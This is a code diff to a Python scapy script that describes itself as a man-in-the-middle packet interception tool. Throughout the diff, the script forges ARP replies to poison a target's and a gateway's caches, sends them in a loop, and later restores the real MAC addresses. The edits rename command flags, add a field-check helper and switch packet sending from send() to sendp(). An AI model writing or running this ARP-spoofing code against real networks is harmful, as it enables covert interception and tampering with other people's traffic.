@@ -1,7 +1,5 @@
-from scapy.all import ARP, Ether, sr1, send, sniff, IP, get_if_hwaddr
+from scapy.all import ARP, Ether, sr1, send, sendp, sniff, IP, get_if_hwaddr
 import colorama, time, sys, subprocess, threading
-
-HELP_FLAG = '-h'
 
 HELP_MESSAGE = f"""
 ATA ({colorama.Fore.RED}Man-In-The-Middle{colorama.Fore.WHITE}):
@@ -23,8 +21,13 @@ A simple tool for packet interception.
 
 stop_event = threading.Event()
 
+def CheckFields(fields):
+	for field in fields:
+		if not field: return False
+	return True
+
 def CheckFlags(required, arguments):
-	if HELP_FLAG in arguments: PrintHelp()
+	if '-h' in arguments: PrintHelp()
 
 	for flag in required:
 		if flag not in arguments: PrintHelp()
@@ -32,7 +35,7 @@ def CheckFlags(required, arguments):
 def PopulateFields(parameters):
 	for argument in range(0, len(sys.argv)):
 		match sys.argv[argument]:
-			case '-s':
+			case '-a':
 				parameters["Attacker"] = sys.argv[argument + 1]
 			case '-t':
 				parameters["Target"] = sys.argv[argument + 1]
@@ -45,13 +48,13 @@ def PopulateFields(parameters):
 			case '-d':
 				parameters["Timeout"] = int(sys.argv[argument + 1])
 			case '-p':
-				parameters["Interval"] = int(sys.argv[argument + 1])
+				parameters["Interval"] = float(sys.argv[argument + 1])
 			case '-v':
 				parameters["Verbose"] = True
 			case '-vv':
 				parameters["Verbose"] = True
 				parameters["Verboser"] = True
-			case HELP_FLAG:
+			case '-h':
 				PrintHelp()
 	return parameters
 
@@ -81,8 +84,8 @@ def Reset(message, gateway, gateway_mac, target, target_mac):
 	gateway_packet = ARP(op=2, psrc=gateway, pdst=target,  hwsrc=gateway_mac, hwdst=target_mac)
 	target_packet  = ARP(op=2, psrc=target,  pdst=gateway, hwsrc=target_mac,  hwdst=gateway_mac)
 
-	send(gateway_packet, count=1, verbose=False)
-	send(target_packet,  count=1, verbose=False)
+	sendp(gateway_packet, count=1, verbose=False)
+	sendp(target_packet,  count=1, verbose=False)
 
 	PrintMessage((gateway_packet.summary(), target_packet.summary()), 0)
 	PrintMessage(message, -1)
@@ -95,8 +98,8 @@ def Spoof(verbose, interval, gateway, gateway_mac, target, target_mac, attacker_
 		if verbose:
 			PrintMessage((target_packet.summary(), gateway_packet.summary()), 0)
 
-		send(gateway_packet, count=1, verbose=False)
-		send(target_packet,  count=1, verbose=False)
+		sendp(gateway_packet, count=1, verbose=False)
+		sendp(target_packet,  count=1, verbose=False)
 
 		time.sleep(interval)
 
